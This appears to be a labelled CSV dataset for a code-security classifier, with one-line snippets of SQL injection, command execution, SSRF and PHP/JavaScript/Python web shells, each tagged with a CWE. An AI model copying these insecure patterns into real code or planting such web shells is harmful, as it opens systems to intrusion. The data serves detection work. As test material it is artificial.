code,label,category,language,cwe,source,package_name,version,license,sample_hash
"cursor.execute('select * from users where id=' + request.args.get('id'))",vulnerable,SQL Injection,python,CWE-89,handwritten,,,, 
"db.query('SELECT * FROM users WHERE name=' + req.query.name)",vulnerable,SQL Injection,javascript,CWE-89,handwritten,,,, 
"sql = 'SELECT * FROM orders WHERE no=' + request.form['no']",vulnerable,SQL Injection,python,CWE-89,handwritten,,,, 
"query = ""select * from user where name='"" + name + ""'""",vulnerable,SQL Injection,java,CWE-89,handwritten,,,, 
"const q = `select * from t where id=${req.query.id}`",vulnerable,SQL Injection,javascript,CWE-89,handwritten,,,, 
"if (id == '1 or 1=1') return db.query('union select password from users')",vulnerable,SQL Injection,javascript,CWE-89,handwritten,,,, 
"eval($_POST['cmd']); system($_GET['x']);",malicious,WebShell,php,CWE-94,handwritten,,,, 
"$x=base64_decode($_REQUEST['p']); eval($x);",malicious,WebShell,php,CWE-94,handwritten,,,, 
"assert($_GET['a']);",malicious,WebShell,php,CWE-94,handwritten,,,, 
"app.post('/run', (req,res)=>Function(req.body.code)())",malicious,WebShell,javascript,CWE-94,handwritten,,,, 
"eval(request.args.get('payload'))",malicious,WebShell,python,CWE-94,handwritten,,,, 
"atob(req.query.payload); eval(payload)",malicious,WebShell,javascript,CWE-94,handwritten,,,, 
"os.system(request.args.get('cmd'))",vulnerable,Command Execution,python,CWE-78,handwritten,,,, 
"child_process.exec(req.query.command)",vulnerable,Command Execution,javascript,CWE-78,handwritten,,,, 
"Runtime.getRuntime().exec(request.getParameter('cmd'))",vulnerable,Command Execution,java,CWE-78,handwritten,,,, 
"shell_exec($_GET['cmd']);",vulnerable,Command Execution,php,CWE-78,handwritten,,,, 
"subprocess.Popen(request.form['command'], shell=True)",vulnerable,Command Execution,python,CWE-78,handwritten,,,, 
"cmd = request.args.get('cmd'); os.system(cmd)",vulnerable,Command Execution,python,CWE-78,handwritten,,,, 
"requests.get(request.args.get('url'))",vulnerable,SSRF,python,CWE-918,handwritten,,,, 
